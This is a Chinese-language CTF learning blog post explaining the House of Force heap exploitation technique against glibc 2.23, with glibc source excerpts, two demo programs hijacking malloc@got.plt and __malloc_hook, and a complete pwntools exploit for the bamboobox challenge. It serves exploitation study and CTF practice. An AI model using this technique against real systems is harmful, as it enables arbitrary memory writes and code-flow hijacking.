---
layout: post
title: House of Force
subheading: 学学pwn
author: Te4P0t
categories: pwn
tags: pwn
---

## 0x00 简介

House of Force属于House of XXX系列的利用方法。House of XXX是2004年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对glibc堆分配器的利用方法。

## 0x01 使用条件&效果

#### 条件：

1. 需要存在漏洞使得用户能够控制top chunk的size域
2. 需要用户能自由控制malloc的分配大小
3. 分配的次数不能受限制

#### 效果：

能够实现任意地址写任意值（write-anything-anywhere）

## 0x02原理

House of Force产生的原因在于glibc对于top chunk的处理。在进行堆分配时，如果所有的空闲块都无法满足需要，那么就会从top chunk中分割出相应的大小作为堆块的空间。

在glibc中会对用户请求的大小和top chunk现有的size进行验证。

如果$sizeof(top\_chunk) \ge malloc\_size + min\_chunk$​就可以对top_chunk进行分割。源码如下：

```c
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

那么只要我们能够将top_chunk的size域改为一个很大的值，如-1（验证时对size转换成了unsigned long，改为-1即可得到最大值），那么无论malloc什么值可以通过验证。

之后可以看到glibc将top指针更新为了remainder，而remainder是chunk_at_offset(victim, nb)，即victim+nb。

由条件2，nb（也即malloc的size）值我们可以随意控制，因此可以随意控制top_chunk的地址，而下一次进行malloc时就会分配top_chunk处的空间，这就达到了任意地址写的功能。

但是与此同时，top chunk的size也会更新。

```c
victim = av->top;
size   = chunksize(victim);
remainder_size = size - nb;
set_head(remainder, remainder_size | PREV_INUSE);
```

所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。

## 0x03样例

#### 样例一

该样例的目标是通过HOF来篡改malloc@got.plt实现劫持程序流程。

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
}
```

首先分配了0x10的块

```assembly
0x602000:   0x0000000000000000  0x0000000000000021 <=== ptr
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 <=== top chunk
0x602030:   0x0000000000000000  0x0000000000000000
```

之后将top chunk的size改为-1（0xffffffffffffffff），在题目中，这一步可以通过堆溢出来实现。

```assembly
0x602000:   0x0000000000000000  0x0000000000000021 <=== ptr
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0xffffffffffffffff <=== top chunk size域被更改
0x602030:   0x0000000000000000  0x0000000000000000
```

此时top chunk的指针仍在0x602020，只有进行malloc(-4120)

top chunk的指针变为了0x602020+(-4112) = 0x601010。

而在编译后的程序中0x601020是 `malloc@got.plt`的地址，因此下次malloc分配chunk的时候，就分配到了 `malloc@got.plt`的地址，从而可以修改该处的值。

target_addr - 0x10 - topchunk_addr​ = -4112

为何要malloc(-4120)呢

用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。

```c
void *__libc_malloc(size_t bytes) {
```

如果想要用户输入的大小经过内部的 `checked_request2size`可以得到这样的大小，即

```c
/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。

另一方面，在满足对应的约束后，我们需要使得 `request2size`正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而**如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。**

#### 样例二

在上一个示例中，我们演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面 (低地址) 的 got 表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点



```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指针
    malloc(0x10);
}
```

我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局

```assembly
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算



0x7ffff7dd1b00-0x602020-0x10=140737345551056 经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00

```assembly
0x7ffff7dd1b20 <main_arena>:    0x0000000100000000  0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x00007ffff7dd1b00 <=== top chunk
0x7ffff7dd1b80 <main_arena+96>: 0x0000000000000000  0x00007ffff7dd1b78
```

之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了

```assembly
rax = 0x00007ffff7dd1b10

0x400562 <main+60>        mov    edi, 0x10
0x400567 <main+65>        call   0x400410 <malloc@plt>
```

## 0x04 实战

## hitcontraining_bamboobox

![image-20211012002823560](https://te4p0t.github.io/assets/images/2021-10/image-20211012002823560.png)

main函数中首先malloc一个0x10的堆块，存放着hello_message函数和goodbye_message函数指针。分别在main函数开始和输入“5”程序退出时调用。

存在漏洞函数magic。

设想：如果能够将堆中goodbye_message地址改为magic函数地址，那么输入“5”退出时就会执行漏洞程序。

![image-20211012002349328](https://te4p0t.github.io/assets/images/2021-10/image-20211012002349328.png)

edit没有检测长度，存在栈溢出，可以控制top chunk的size域（满足条件1）

![image-20211012002500311](https://te4p0t.github.io/assets/images/2021-10/image-20211012002500311.png)

add函数没有malloc申请size限制（满足条件2）

分配次数99次（满足条件3）

所以可以House of Force

```python
from pwn_debug import *
context.log_level = 'debug'

p = process(['/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so','./bamboobox'],env={"LD_PRELOAD":"/home/xyc/libc/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"})
elf = ELF("./bamboobox")

magic_addr = elf.symbols['magic']

def add(size, content):
	p.recvuntil("Your choice:")
	p.sendline("2")
	p.recvuntil("Please enter the length of item name:")
	p.sendline(str(size))
	p.recvuntil("Please enter the name of item:")
	p.send(content)
	
def show(index):
	p.recvuntil("Your choice:")
	p.sendline("1")

def edit(index, size, content):
	p.recvuntil("Your choice:")
	p.sendline("3")
	p.recvuntil("Please enter the index of item:")
	p.sendline(str(index))
	p.recvuntil("Please enter the length of item name:")
	p.sendline(str(size))
	p.recvuntil("Please enter the new name of the item:")
	p.send(content)
	
def delete(index):
	p.recvuntil("Your choice:")
	p.sendline("4")
	p.recvuntil("Please enter the index of item:")
	p.sendline(str(index))
	
add(0x20, 'a') #0
add(0x20, 'b') #1
edit(1, 0x30, b'a'*0x20 + p64(0) + p64(0xffffffffffffffff))	# 修改top chunk的size域为-1
offset = -(0x60+0x20) - 0x10								# 计算和函数栈偏移，确定malloc的大小
loc_size = offset
add(loc_size, 'a') #2										# malloc后top chunk位于target_addr - 0x10,此时
add(0x10, 'c') #3											# 该处分配的堆地址在target_addr，改为magic函数地址
edit(3, 0x10, p64(magic_addr) * 2)
p.recv()
#gdb.attach(p)
#pause()
p.interactive()												# 输入5执行漏洞程序

```

![image-20211012003455672](https://te4p0t.github.io/assets/images/2021-10/image-20211012003455672.png)

拿到flag
